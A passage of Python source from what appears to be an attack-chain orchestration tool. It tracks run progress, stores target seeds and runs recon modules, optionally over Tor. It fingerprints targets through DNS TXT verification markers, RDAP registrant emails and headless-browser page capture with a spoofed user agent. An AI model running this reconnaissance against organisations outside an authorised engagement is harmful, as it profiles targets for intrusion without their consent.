            "live_probing_allowed": not dry_run_all,
            "tool_execution_allowed": not dry_run_all,
            "scope_manifest_source": (
                str(scope_manifest_metadata.get("source") or "")
                if isinstance(scope_manifest_metadata, dict)
                else ""
            ),
            "live_execution_policy": _live_execution_policy_metadata(),
            "report_provider": report_provider or "default",
            "report_max_loops": report_max_loops,
            "last_step": str(run_progress_state.get("last_step") or ""),
            "last_message": str(run_progress_state.get("last_message") or ""),
            "last_step_elapsed_seconds": float(run_progress_state.get("last_step_elapsed_seconds") or 0.0),
            "last_step_at": str(run_progress_state.get("last_step_at") or ""),
            "active_batch_label": str(run_progress_state.get("active_batch_label") or ""),
            "active_batch_eta_seconds": (
                round(float(active_batch_eta_seconds), 1)
                if isinstance(active_batch_eta_seconds, (int, float)) and not isinstance(active_batch_eta_seconds, bool)
                else None
            ),
            "active_artifact_stage_label": str(run_progress_state.get("active_artifact_stage_label") or ""),
            "active_artifact_eta_seconds": (
                round(float(active_artifact_eta_seconds), 1)
                if isinstance(active_artifact_eta_seconds, (int, float))
                and not isinstance(active_artifact_eta_seconds, bool)
                else None
            ),
            "active_validation_stage_label": str(run_progress_state.get("active_validation_stage_label") or ""),
            "active_validation_eta_seconds": (
                round(float(active_validation_eta_seconds), 1)
                if isinstance(active_validation_eta_seconds, (int, float))
                and not isinstance(active_validation_eta_seconds, bool)
                else None
            ),
            "active_finalization_stage_label": str(run_progress_state.get("active_finalization_stage_label") or ""),
            "active_finalization_eta_seconds": (
                round(float(active_finalization_eta_seconds), 1)
                if isinstance(active_finalization_eta_seconds, (int, float))
                and not isinstance(active_finalization_eta_seconds, bool)
                else None
            ),
            "recent_steps": list(recent_steps)[-8:],
            "counts": dict(counts),
            "queue_metrics": {
                str(group): {
                    str(label): int(count or 0)
                    for label, count in values.items()
                }
                for group, values in queue_metrics.items()
                if isinstance(values, dict)
            },
            "pending_work_counts": {
                str(label): int(count or 0)
                for label, count in pending_work_counts.items()
            },
            "pending_work_total": int(run_progress_state.get("pending_work_total") or 0),
            "last_iteration_delta": dict(last_iteration_delta),
            "last_iteration_stable": last_iteration_stable if isinstance(last_iteration_stable, bool) else None,
        }

    def _current_run_progress_payload() -> dict[str, object]:
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        active_batch_eta_seconds = run_progress_state.get("active_batch_eta_seconds")
        active_artifact_eta_seconds = run_progress_state.get("active_artifact_eta_seconds")
        active_validation_eta_seconds = run_progress_state.get("active_validation_eta_seconds")
        active_finalization_eta_seconds = run_progress_state.get("active_finalization_eta_seconds")
        return {
            "phase": str(run_progress_state.get("phase") or ""),
            "last_step": str(run_progress_state.get("last_step") or ""),
            "last_message": str(run_progress_state.get("last_message") or ""),
            "last_step_elapsed_seconds": round(float(run_progress_state.get("last_step_elapsed_seconds") or 0.0), 3),
            "last_step_at": str(run_progress_state.get("last_step_at") or ""),
            "current_iteration": last_iteration,
            "run_kind": "kill_chain",
            "counts": dict(run_progress_state.get("counts") or {}),
            "queue_metrics": {
                str(group): dict(values)
                for group, values in queue_metrics.items()
                if isinstance(values, dict)
            },
            "pending_work_counts": dict(run_progress_state.get("pending_work_counts") or {}),
            "pending_work_total": int(run_progress_state.get("pending_work_total") or 0),
            "last_iteration_delta": dict(run_progress_state.get("last_iteration_delta") or {}),
            "last_iteration_stable": run_progress_state.get("last_iteration_stable"),
            "active_batch_label": str(run_progress_state.get("active_batch_label") or ""),
            "active_batch_eta_seconds": (
                round(float(active_batch_eta_seconds), 1)
                if isinstance(active_batch_eta_seconds, (int, float)) and not isinstance(active_batch_eta_seconds, bool)
                else None
            ),
            "active_artifact_stage_label": str(run_progress_state.get("active_artifact_stage_label") or ""),
            "active_artifact_eta_seconds": (
                round(float(active_artifact_eta_seconds), 1)
                if isinstance(active_artifact_eta_seconds, (int, float))
                and not isinstance(active_artifact_eta_seconds, bool)
                else None
            ),
            "active_validation_stage_label": str(run_progress_state.get("active_validation_stage_label") or ""),
            "active_validation_eta_seconds": (
                round(float(active_validation_eta_seconds), 1)
                if isinstance(active_validation_eta_seconds, (int, float))
                and not isinstance(active_validation_eta_seconds, bool)
                else None
            ),
            "active_finalization_stage_label": str(run_progress_state.get("active_finalization_stage_label") or ""),
            "active_finalization_eta_seconds": (
                round(float(active_finalization_eta_seconds), 1)
                if isinstance(active_finalization_eta_seconds, (int, float))
                and not isinstance(active_finalization_eta_seconds, bool)
                else None
            ),
        }

    def _flush_run_progress_state() -> None:
        if engagement_run_tracker is None or engagement_run_handle is None:
            return
        try:
            engagement_run_tracker.update_run(
                engagement_run_handle,
                current_iteration=last_iteration,
                metadata=_engagement_run_metadata(),
            )
        except sqlite3.OperationalError as exc:
            # Progress snapshots are best-effort. Seed/result persistence may hold
            # the write lock briefly, so skip this flush and let the next update win.
            if "database is locked" not in str(exc).lower():
                raise
        if progress_event_queue is None:
            return
        try:
            progress_event_queue.publish(
                "forge.events",
                {
                    "engagement_id": engagement_id,
                    "message": "engagement_run_progress",
                    "payload": _current_run_progress_payload(),
                },
            )
        except Exception:  # noqa: BLE001
            pass

    def _record_batch_progress(label: str, metrics: dict[str, object]) -> None:
        if not label:
            return
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        queue_metrics["fanout_batch"] = {
            key: int(metrics.get(key) or 0)
            for key in ("total", "workers", "running", "pending", "queue_depth", "completed", "failed")
        }
        run_progress_state["queue_metrics"] = queue_metrics
        run_progress_state["active_batch_label"] = label
        eta_seconds = metrics.get("eta_seconds")
        run_progress_state["active_batch_eta_seconds"] = (
            round(float(eta_seconds), 1)
            if isinstance(eta_seconds, (int, float)) and not isinstance(eta_seconds, bool)
            else None
        )
        _flush_run_progress_state()

    def _record_artifact_progress(label: str, metrics: dict[str, object]) -> None:
        if not label:
            return
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        queue_metrics["artifact_processor"] = {
            key: int(metrics.get(key) or 0)
            for key in ("total", "workers", "running", "pending", "queue_depth", "completed", "failed")
        }
        run_progress_state["queue_metrics"] = queue_metrics
        run_progress_state["active_artifact_stage_label"] = label
        eta_seconds = metrics.get("eta_seconds")
        run_progress_state["active_artifact_eta_seconds"] = (
            round(float(eta_seconds), 1)
            if isinstance(eta_seconds, (int, float)) and not isinstance(eta_seconds, bool)
            else None
        )
        _flush_run_progress_state()

    def _record_artifact_cumulative_metrics(
        *,
        queued_local: int = 0,
        artifact_summary: object | None = None,
    ) -> None:
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        existing = queue_metrics.get("artifact_processor_cumulative")
        if not isinstance(existing, dict):
            existing = {}

        cumulative = {
            "local_intake_queued": int(existing.get("local_intake_queued") or 0),
            "invocations": int(existing.get("invocations") or 0),
            "processed": int(existing.get("processed") or 0),
            "failed": int(existing.get("failed") or 0),
            "skipped": int(existing.get("skipped") or 0),
            "firebase_projects": int(existing.get("firebase_projects") or 0),
            "supabase_configs": int(existing.get("supabase_configs") or 0),
            "discovered_seeds": int(existing.get("discovered_seeds") or 0),
        }

        if queued_local:
            cumulative["local_intake_queued"] += max(0, int(queued_local))

        if artifact_summary is not None:
            cumulative["invocations"] += 1
            cumulative["processed"] += max(0, int(getattr(artifact_summary, "processed", 0) or 0))
            cumulative["failed"] += max(0, int(getattr(artifact_summary, "failed", 0) or 0))
            cumulative["skipped"] += max(0, int(getattr(artifact_summary, "skipped", 0) or 0))
            cumulative["firebase_projects"] += max(
                0,
                int(getattr(artifact_summary, "firebase_projects", 0) or 0),
            )
            cumulative["supabase_configs"] += max(
                0,
                int(getattr(artifact_summary, "supabase_configs", 0) or 0),
            )
            cumulative["discovered_seeds"] += max(
                0,
                int(getattr(artifact_summary, "discovered_seeds", 0) or 0),
            )

        queue_metrics["artifact_processor_cumulative"] = cumulative
        run_progress_state["queue_metrics"] = queue_metrics
        _flush_run_progress_state()

    def _record_validation_progress(label: str, metrics: dict[str, object]) -> None:
        if not label:
            return
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        queue_metrics["validation_batch"] = {
            key: int(metrics.get(key) or 0)
            for key in ("total", "workers", "running", "pending", "queue_depth", "completed", "failed")
        }
        run_progress_state["queue_metrics"] = queue_metrics
        run_progress_state["active_validation_stage_label"] = label
        eta_seconds = metrics.get("eta_seconds")
        run_progress_state["active_validation_eta_seconds"] = (
            round(float(eta_seconds), 1)
            if isinstance(eta_seconds, (int, float)) and not isinstance(eta_seconds, bool)
            else None
        )
        _flush_run_progress_state()

    def _record_finalization_progress(label: str, metrics: dict[str, object]) -> None:
        if not label:
            return
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        queue_metrics["finalization_batch"] = {
            key: int(metrics.get(key) or 0)
            for key in ("total", "workers", "running", "pending", "queue_depth", "completed", "failed")
        }
        run_progress_state["queue_metrics"] = queue_metrics
        run_progress_state["active_finalization_stage_label"] = label
        eta_seconds = metrics.get("eta_seconds")
        run_progress_state["active_finalization_eta_seconds"] = (
            round(float(eta_seconds), 1)
            if isinstance(eta_seconds, (int, float)) and not isinstance(eta_seconds, bool)
            else None
        )
        _flush_run_progress_state()

    # ─── Persist the seeds themselves into the DB so downstream modules see them ─
    def _upsert_engagement_seed(
        con: Any,
        seed_value: str,
        entry_type: str,
        *,
        source: str,
        status: str,
        depth: int = 0,
        confidence: float = 1.0,
        metadata: dict[str, Any] | None = None,
    ) -> None:
        metadata_payload = metadata if isinstance(metadata, dict) else {}
        try:
            metadata_json = json.dumps(metadata_payload, sort_keys=True) if metadata_payload else "{}"
        except (TypeError, ValueError):
            metadata_json = "{}"
        try:
            con.execute(
                """
                INSERT INTO engagement_seeds
                    (engagement_id, seed_value, seed_type, source, status, depth, confidence, metadata_json)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(engagement_id, seed_type, seed_value) DO UPDATE SET
                    source=excluded.source,
                    status=excluded.status,
                    depth=MIN(engagement_seeds.depth, excluded.depth),
                    confidence=MAX(engagement_seeds.confidence, excluded.confidence),
                    metadata_json=CASE
                        WHEN excluded.metadata_json != '{}' THEN excluded.metadata_json
                        ELSE engagement_seeds.metadata_json
                    END,
                    updated_at=CURRENT_TIMESTAMP
                """,
                (
                    engagement_id,
                    seed_value,
                    entry_type,
                    source,
                    status,
                    depth,
                    confidence,
                    metadata_json,
                ),
            )
        except Exception:  # noqa: BLE001
            pass

    def _persist_seed() -> None:
        import sqlite3 as _sq2  # noqa: PLC0415
        con = _sq2.connect(db_path)
        try:
            for index, seed_entry in enumerate(classified_seeds):
                seed_value = str(seed_entry["value"])
                entry_type = str(seed_entry["seed_type"])
                _upsert_engagement_seed(
                    con,
                    seed_value,
                    entry_type,
                    source="operator",
                    status="pending",
                    depth=0,
                    confidence=1.0 if index == 0 else 0.95,
                )
                if entry_type == "email":
                    try:
                        con.execute(
                            "INSERT INTO emails (engagement_id, email, source) "
                            "VALUES (?, ?, 'kill_chain_seed')",
                            (engagement_id, seed_value.lower()),
                        )
                    except (_sq2.IntegrityError, _sq2.OperationalError):
                        pass
                elif entry_type == "domain":
                    try:
                        con.execute(
                            "INSERT INTO hosts (engagement_id, ip, hostname, os_family, host_context) "
                            "VALUES (?, ?, ?, 'unknown', ?)",
                            (engagement_id, "0.0.0.0", seed_value.lower(),
                             _host_context_json(
                                 "kill_chain_seed",
                                 synthetic_ip=True,
                             )),
                        )
                    except (_sq2.IntegrityError, _sq2.OperationalError):
                        pass
                elif entry_type in {"ipv4", "ipv6"}:
                    try:
                        con.execute(
                            "INSERT INTO hosts (engagement_id, ip, hostname, os_family, host_context) "
                            "VALUES (?, ?, ?, 'unknown', ?)",
                            (engagement_id, seed_value, "",
                             _host_context_json("kill_chain_seed"),
                            ),
                        )
                    except (_sq2.IntegrityError, _sq2.OperationalError):
                        pass
                elif entry_type in {"url", "apk_url"}:
                    _promote_cloud_asset_seed_refs(con, seed_value)
                    _promote_social_url_seed_refs(
                        con,
                        seed_value,
                        entry_type,
                        evidence_rule="operator_social_url_extract",
                    )
            con.commit()
        finally:
            con.close()

    _persist_seed()
    seed_run_tracker = None

    _cli_audit(
        db_path, engagement_id, "orchestrator", "kill_chain",
        "kill_chain_start", target=seed,
        result=(f"seed_type={seed_type} seed_count={len(classified_seeds)} "
                f"root_domains={','.join(root_domains) if root_domains else '-'} "
                f"skip_keyscan={skip_keyscan} "
                f"skip_cloud={skip_cloud} tor={tor} dry_run={dry_run} "
                f"attack_mode={attack_mode} live_probe={not dry_run_all} "
                f"auto_run_detected={auto_run_detected} "
                f"roe_id={roe_id or '-'} "
                f"scope_manifest={'present' if scope_manifest_metadata else '-'} "
                f"max_iter={max_iter}"),
    )

    def _publish_run_progress(step: str, msg: str = "", *, force: bool = False) -> None:
        if engagement_run_tracker is None or engagement_run_handle is None:
            return
        step_text = _strip_console_markup(step)[:160]
        msg_text = _strip_console_markup(msg)[:320]
        if not step_text:
            return
        if not force and step_text == str(run_progress_state.get("last_step") or "") and msg_text == str(run_progress_state.get("last_message") or ""):
            return
        elapsed = _time.time() - step_start
        run_progress_state["phase"] = _infer_run_phase(step_text)
        run_progress_state["last_step"] = step_text
        run_progress_state["last_message"] = msg_text
        run_progress_state["last_step_elapsed_seconds"] = round(elapsed, 3)
        run_progress_state["last_step_at"] = _time.strftime("%Y-%m-%dT%H:%M:%SZ", _time.gmtime())
        recent_steps = run_progress_state.get("recent_steps")
        if not isinstance(recent_steps, list):
            recent_steps = []
        recent_steps.append(
            {
                "step": step_text,
                "message": msg_text,
                "phase": str(run_progress_state.get("phase") or ""),
                "iteration": last_iteration,
                "elapsed_seconds": round(elapsed, 3),
                "at": str(run_progress_state.get("last_step_at") or ""),
            }
        )
        run_progress_state["recent_steps"] = recent_steps[-8:]
        _flush_run_progress_state()

    def _log(step: str, msg: str = "") -> None:
        elapsed = _time.time() - step_start
        console.print(f"[bold cyan][kill-chain t+{elapsed:6.1f}s][/bold cyan] {step}: {msg}")
        _publish_run_progress(step, msg)

    def _seed_context(
        seed_value: str,
        seed_type: str,
        *,
        source: str = "discovered",
        depth: int = 0,
        confidence: float = 1.0,
        metadata: Optional[dict[str, object]] = None,
    ) -> dict[str, object]:
        return {
            "seed_value": seed_value.strip(),
            "seed_type": seed_type,
            "source": source,
            "depth": depth,
            "confidence": confidence,
            "metadata": metadata or {},
        }

    def _run_module(
        cmd_argv: list[str],
        label: str,
        *,
        loop_name: str | None = None,
        seed_contexts: Optional[list[dict[str, object]]] = None,
        metadata: Optional[dict[str, object]] = None,
    ) -> int:
        run_handles: list[tuple[object, dict[str, object]]] = []
        base_metadata: dict[str, object] = {
            "label": label,
            "command": "forge " + " ".join(cmd_argv),
            "timeout_seconds": module_timeout_seconds,
        }
        if metadata:
            base_metadata.update(metadata)
        if seed_run_tracker is not None and loop_name and seed_contexts:
            run_handles = _start_module_seed_runs(
                seed_contexts,
                loop_name_value=loop_name,
                base_metadata_value=base_metadata,
                progress_label_prefix=label,
            )
        if dry_run_all:
            _log(label, f"[yellow]DRY-RUN-ALL[/yellow] would run: "
                        f"forge {' '.join(cmd_argv)}")
            _cli_audit(
                db_path, engagement_id, "orchestrator", "kill_chain",
                "dry_run_all_step", target=label,
                result="forge " + " ".join(cmd_argv),
            )
            _finalize_module_seed_runs(
                run_handles,
                base_metadata_value=base_metadata,
                status="skipped",
                output_count=0,
                extra_metadata={"mode": "dry_run"},
                progress_label_prefix=label,
            )
            return 0
        _log(label, "starting")
        proc = _run_forge_module_subprocess(
            cmd_argv,
            tor_prefix=_tor_prefix,
            timeout_seconds=module_timeout_seconds,
        )
        if proc.returncode != 0:
            _log(label, f"[yellow]exit={proc.returncode}[/yellow] "
                        f"stderr={proc.stderr[-200:] if proc.stderr else 'none'}")
            _finalize_module_seed_runs(
                run_handles,
                base_metadata_value=base_metadata,
                status="failed",
                output_count=0,
                error=proc.stderr[-512:] if proc.stderr else f"exit={proc.returncode}",
                extra_metadata={"returncode": proc.returncode},
                progress_label_prefix=label,
            )
        else:
            tail = proc.stdout.strip().splitlines()[-1] if proc.stdout.strip() else "ok"
            _log(label, f"[green]done[/green]  {tail[:100]}")
            _finalize_module_seed_runs(
                run_handles,
                base_metadata_value=base_metadata,
                status="completed",
                output_count=1,
                extra_metadata={
                    "stdout_tail": tail[:180],
                    "returncode": proc.returncode,
                },
                progress_label_prefix=label,
            )
        return proc.returncode

    def _start_seed_run(
        seed_value: str,
        seed_type: str,
        loop_name: str,
        *,
        source: str = "orchestrator",
        depth: int = 0,
        confidence: float = 1.0,
        metadata: Optional[dict[str, object]] = None,
    ):
        if seed_run_tracker is None:
            return None
        return seed_run_tracker.start_run(
            seed_value,
            seed_type,
            loop_name,
            source=source,
            depth=depth,
            confidence=confidence,
            metadata=metadata,
        )

    def _finish_seed_run(
        handle,
        *,
        status: str,
        output_count: int = 0,
        error: str | None = None,
        metadata: Optional[dict[str, object]] = None,
    ) -> None:
        if seed_run_tracker is None or handle is None:
            return
        seed_run_tracker.finish_run(
            handle,
            status=status,
            output_count=output_count,
            error=error,
            metadata=metadata,
        )

    def _prepare_module_seed_run_start_entry(
        seed_ctx: dict[str, object],
        *,
        loop_name_value: str,
        base_metadata_value: dict[str, object],
    ) -> dict[str, object]:
        return {
            "seed_ctx": seed_ctx,
            "seed_value": str(seed_ctx["seed_value"]),
            "seed_type": str(seed_ctx["seed_type"]),
            "loop_name": loop_name_value,
            "source": str(seed_ctx.get("source", "orchestrator")),
            "depth": int(seed_ctx.get("depth", 0)),
            "confidence": float(seed_ctx.get("confidence", 1.0)),
            "metadata": {
                **base_metadata_value,
                **dict(seed_ctx.get("metadata", {}) or {}),
            },
        }

    def _apply_module_seed_run_start_entry(
        item: dict[str, object] | None,
    ) -> tuple[object, dict[str, object]] | None:
        if item is None or seed_run_tracker is None:
            return None
        seed_ctx = cast(dict[str, object], item.get("seed_ctx") or {})
        handle = seed_run_tracker.start_run(
            str(item["seed_value"]),
            str(item["seed_type"]),
            str(item["loop_name"]),
            source=str(item["source"]),
            depth=int(item["depth"]),
            confidence=float(item["confidence"]),
            input_count=1,
            metadata=cast(dict[str, object], item["metadata"]),
        )
        return handle, seed_ctx

    def _start_module_seed_runs(
        seed_contexts: Sequence[dict[str, object]],
        *,
        loop_name_value: str,
        base_metadata_value: dict[str, object],
        progress_label_prefix: str,
    ) -> list[tuple[object, dict[str, object]]]:
        if seed_run_tracker is None or not loop_name_value or not seed_contexts:
            return []
        prep_progress_label = f"{progress_label_prefix} seed-run start prep"
        merge_progress_label = f"{progress_label_prefix} seed-run start"
        if len(seed_contexts) > 1 and parallel_workers > 1:
            _log(
                prep_progress_label,
                f"[dim]parallel parse x{min(parallel_workers, len(seed_contexts))}[/dim]",
            )
        prepared_start_entries = _run_inprocess_batch(
            list(seed_contexts),
            lambda item: _prepare_module_seed_run_start_entry(
                item,
                loop_name_value=loop_name_value,
                base_metadata_value=base_metadata_value,
            ),
            max_workers=parallel_workers,
            progress_label=prep_progress_label,
            progress_callback=_record_batch_progress,
        )
        started_run_entries = _run_ordered_inprocess_apply_batch(
            prepared_start_entries,
            _apply_module_seed_run_start_entry,
            progress_label=merge_progress_label,
            progress_callback=_record_batch_progress,
            order_note="seed-run start order preserved",
        )
        return [
            cast(tuple[object, dict[str, object]], item)
            for item in started_run_entries
            if item is not None
        ]

    def _start_seed_run_handles_from_contexts(
        seed_contexts: Sequence[dict[str, object]],
        *,
        loop_name_value: str,
        base_metadata_value: dict[str, object],
        progress_label_prefix: str,
    ) -> list[object]:
        return [
            handle
            for handle, _seed_ctx in _start_module_seed_runs(
                seed_contexts,
                loop_name_value=loop_name_value,
                base_metadata_value=base_metadata_value,
                progress_label_prefix=progress_label_prefix,
            )
            if handle is not None
        ]

    def _prepare_one_shot_seed_run_entry(
        *,
        seed_value: str,
        seed_type: str,
        loop_name: str,
        source: str = "orchestrator",
        depth: int = 0,
        confidence: float = 1.0,
        start_metadata: Optional[dict[str, object]] = None,
        status: str,
        output_count: int = 0,
        error: str | None = None,
        finish_metadata: Optional[dict[str, object]] = None,
    ) -> dict[str, object] | None:
        normalized_seed_value = str(seed_value or "").strip()
        normalized_seed_type = str(seed_type or "").strip()
        normalized_loop_name = str(loop_name or "").strip()
        normalized_status = str(status or "").strip()
        if (
            not normalized_seed_value
            or not normalized_seed_type
            or not normalized_loop_name
            or not normalized_status
        ):
            return None
        return {
            "seed_value": normalized_seed_value,
            "seed_type": normalized_seed_type,
            "loop_name": normalized_loop_name,
            "source": str(source or "orchestrator"),
            "depth": int(depth or 0),
            "confidence": float(confidence or 0.0),
            "start_metadata": dict(start_metadata or {}),
            "status": normalized_status,
            "output_count": int(output_count or 0),
            "error": error,
            "finish_metadata": dict(finish_metadata or {}),
        }

    def _apply_one_shot_seed_run_entry(
        item: dict[str, object] | None,
    ) -> str | None:
        if item is None:
            return None
        seed_value = str(item.get("seed_value") or "").strip()
        seed_type = str(item.get("seed_type") or "").strip()
        loop_name = str(item.get("loop_name") or "").strip()
        status = str(item.get("status") or "").strip()
        if not seed_value or not seed_type or not loop_name or not status:
            return None
        handle = _start_seed_run(
            seed_value,
            seed_type,
            loop_name,
            source=str(item.get("source") or "orchestrator"),
            depth=int(item.get("depth") or 0),
            confidence=float(item.get("confidence") or 0.0),
            metadata=cast(Optional[dict[str, object]], item.get("start_metadata")),
        )
        _finish_seed_run(
            handle,
            status=status,
            output_count=int(item.get("output_count") or 0),
            error=cast(str | None, item.get("error")),
            metadata=cast(Optional[dict[str, object]], item.get("finish_metadata")),
        )
        return seed_value

    def _prepare_module_seed_run_finalization_entry(
        item: tuple[object, dict[str, object]],
        *,
        base_metadata_value: dict[str, object],
        status: str,
        output_count: int,
        error: str | None = None,
        extra_metadata: Optional[dict[str, object]] = None,
    ) -> dict[str, object] | None:
        handle, seed_ctx = item
        if handle is None:
            return None
        final_metadata: dict[str, object] = {
            **base_metadata_value,
            **dict(seed_ctx.get("metadata", {}) or {}),
        }
        if extra_metadata:
            final_metadata.update(extra_metadata)
        return {
            "handle": handle,
            "status": status,
            "output_count": int(output_count),
            "error": error,
            "metadata": final_metadata,
        }

    def _apply_module_seed_run_finalization_entry(
        item: dict[str, object] | None,
    ) -> str | None:
        if item is None:
            return None
        handle = item.get("handle")
        if handle is None:
            return None
        status = str(item.get("status") or "").strip()
        if not status:
            return None
        _finish_seed_run(
            handle,
            status=status,
            output_count=int(item.get("output_count") or 0),
            error=cast(str | None, item.get("error")),
            metadata=cast(Optional[dict[str, object]], item.get("metadata")),
        )
        return status

    def _finalize_module_seed_runs(
        run_handles: Sequence[tuple[object, dict[str, object]]],
        *,
        base_metadata_value: dict[str, object],
        status: str,
        output_count: int,
        error: str | None = None,
        extra_metadata: Optional[dict[str, object]] = None,
        progress_label_prefix: str,
    ) -> None:
        if seed_run_tracker is None or not run_handles:
            return
        prep_progress_label = f"{progress_label_prefix} seed-run finalize prep"
        merge_progress_label = f"{progress_label_prefix} seed-run finalize"
        if len(run_handles) > 1 and parallel_workers > 1:
            _log(
                prep_progress_label,
                f"[dim]parallel parse x{min(parallel_workers, len(run_handles))}[/dim]",
            )
        prepared_finalization_entries = _run_inprocess_batch(
            list(run_handles),
            lambda item: _prepare_module_seed_run_finalization_entry(
                item,
                base_metadata_value=base_metadata_value,
                status=status,
                output_count=output_count,
                error=error,
                extra_metadata=extra_metadata,
            ),
            max_workers=parallel_workers,
            progress_label=prep_progress_label,
            progress_callback=_record_batch_progress,
        )
        _run_ordered_inprocess_apply_batch(
            prepared_finalization_entries,
            _apply_module_seed_run_finalization_entry,
            progress_label=merge_progress_label,
            progress_callback=_record_batch_progress,
            order_note="seed-run finalization order preserved",
        )

    def _fetch_target_html(url: str, timeout: float = 15.0) -> str:
        try:
            import httpx  # noqa: PLC0415
            from forge.utils.intel.http_pacing import web_fetch_get  # noqa: PLC0415

            with httpx.Client(follow_redirects=True, timeout=timeout,
                              verify=False) as client:  # noqa: S501
                r = web_fetch_get(client, url)
                return r.text or ""
        except Exception:  # noqa: BLE001
            return ""

    def _fetch_playwright_rendered(url: str, timeout: float = 20.0) -> str:
        """SPA-aware fetch: launch headless chromium, wait for networkidle,
        return the fully-rendered DOM as HTML string. Returns "" on any
        failure (missing playwright, browser install missing, nav timeout).

        Slower than httpx (~5-15s cold) but captures content that React /
        Vue / Angular render only after JS executes.
        """
        try:
            from playwright.sync_api import sync_playwright  # noqa: PLC0415
        except ImportError:
            return ""
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                try:
                    ctx = browser.new_context(
                        ignore_https_errors=True,
                        user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    "Chrome/120.0.0.0 Safari/537.36"),
                    )
                    page = ctx.new_page()
                    page.goto(url, timeout=int(timeout * 1000),
                              wait_until="domcontentloaded")
                    # Give SPA JS a moment to fetch + render
                    try:
                        page.wait_for_load_state("networkidle",
                                                  timeout=5000)
                    except Exception:  # noqa: BLE001
                        pass
                    html = page.content() or ""
                    return html
                finally:
                    browser.close()
        except Exception:  # noqa: BLE001
            return ""

    def _dns_records(host: str, timeout: float = 5.0) -> dict[str, list[str]]:
        """Query MX / TXT / NS / CNAME for a host. Returns dict of record
        type -> list of string values. Empty on any resolver failure.

        TXT records typically leak: SPF (email provider), DMARC, verification
        tokens for Google, Slack, Zoom, Stripe, GitHub Enterprise, MS 365 etc.
        Each token is a signal that org uses that SaaS.
        """
        result: dict[str, list[str]] = {"MX": [], "TXT": [], "NS": [], "CNAME": []}
        try:
            import dns.resolver  # noqa: PLC0415
        except ImportError:
            return result
        resolve_method = getattr(dns.resolver.Resolver, "resolve", None)
        if (
            os.environ.get("FORGE_ENV", "").strip().lower() == "test"
            and os.environ.get("FORGE_ALLOW_TEST_DNS", "").strip().lower()
            not in {"1", "true", "yes", "on"}
            and getattr(resolve_method, "__module__", "") == "dns.resolver"
        ):
            return result
        resolver = dns.resolver.Resolver()
        resolver.lifetime = timeout
        resolver.timeout = timeout
        for rtype in result:
            try:
                answers = resolver.resolve(host, rtype, raise_on_no_answer=False)
                for a in answers:
                    result[rtype].append(str(a).strip('"').strip())
            except Exception:  # noqa: BLE001
                continue
        return result

    def _dns_worker_count(requested_workers: int) -> int:
        try:
            configured = int(
                os.environ.get("FORGE_DNS_MAX_WORKERS", str(_DNS_DEFAULT_MAX_WORKERS)).strip()
                or str(_DNS_DEFAULT_MAX_WORKERS)
            )
        except ValueError:
            configured = _DNS_DEFAULT_MAX_WORKERS
        return max(1, min(max(1, int(requested_workers or 1)), max(1, configured)))

    _DNS_SIGNAL_MARKERS = (
        ("google-site-verification", "google"),
        ("google-workspace", "google_workspace"),
        ("v=spf1", "spf"),
        ("v=dmarc1", "dmarc"),
        ("include:_spf.google", "google_workspace"),
        ("include:spf.protection.outlook", "office365"),
        ("include:mail.zendesk", "zendesk"),
        ("include:mailgun.org", "mailgun"),
        ("include:sendgrid.net", "sendgrid"),
        ("include:_spf.salesforce", "salesforce"),
        ("include:_spf.intuit", "intuit"),
        ("stripe-verification", "stripe"),
        ("slack-verification", "slack"),
        ("zoom-domain-verify", "zoom"),
        ("atlassian-domain-verification", "atlassian"),
        ("github-verification", "github_enterprise"),
        ("ms-", "microsoft"),
        ("apple-domain-verification", "apple"),
        ("facebook-domain-verification", "facebook"),
        ("shopify-domain-verification", "shopify"),
        ("aws-ses", "aws_ses"),
        ("docusign", "docusign"),
        ("miro-verification", "miro"),
        ("notion-domain-verification", "notion"),
    )

    def _dns_probe_root_domain(
        root_domain: str,
        known_hosts: list[str],
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
    ) -> dict[str, object]:
        host_candidates: list[str] = []
        seen_hosts: set[str] = set()
        for candidate in [root_domain, *known_hosts]:
            normalized = str(candidate or "").strip().lower().rstrip(".")
            if not normalized:
                continue
            if normalized != root_domain and not normalized.endswith("." + root_domain):
                continue
            if normalized in seen_hosts:
                continue
            seen_hosts.add(normalized)
            host_candidates.append(normalized)

        queried_hosts = host_candidates[:15]
        discovered_targets: set[str] = set()
        signals: set[str] = set()
        dns_record_workers = _dns_worker_count(max_workers)
        record_results = _run_callable_batch(
            queried_hosts,
            lambda host: (host, _dns_records(str(host), timeout=4.0)),
            max_workers=dns_record_workers,
            progress_label=progress_label,
        )
        for _host, rec in record_results:
            for tgt in rec.get("CNAME", []):
                normalized_target = tgt.rstrip(".").lower()
                if normalized_target == root_domain or normalized_target.endswith("." + root_domain):
                    discovered_targets.add(normalized_target)
            for txt in rec.get("TXT", []):
                lowered_txt = txt.lower()
                for marker, signal_name in _DNS_SIGNAL_MARKERS:
                    if marker in lowered_txt:
                        signals.add(signal_name)
        return {
            "root_domain": root_domain,
            "queried_hosts": queried_hosts,
            "cname_targets": sorted(discovered_targets),
            "signals": sorted(signals),
        }

    def _rdap_lookup(domain_name: str, timeout: float = 8.0) -> dict[str, object]:
        """Query IANA RDAP (modern replacement for whois) for the domain.
        Returns dict with keys: registrant_emails (list), registrar (str),
        related_nameservers (list). Empty dict on failure.
        """
        result: dict[str, object] = {}
        try:
            import httpx  # noqa: PLC0415
            with httpx.Client(follow_redirects=True, timeout=timeout,
                              verify=False) as c:  # noqa: S501
                r = c.get(f"https://rdap.org/domain/{domain_name}")
                if r.status_code != 200:
                    return {}
                data = r.json()
        except Exception:  # noqa: BLE001
            return {}
        emails: list[str] = []
        for entity in data.get("entities", []):
            vcard = entity.get("vcardArray")
            if not vcard or len(vcard) < 2:
                continue
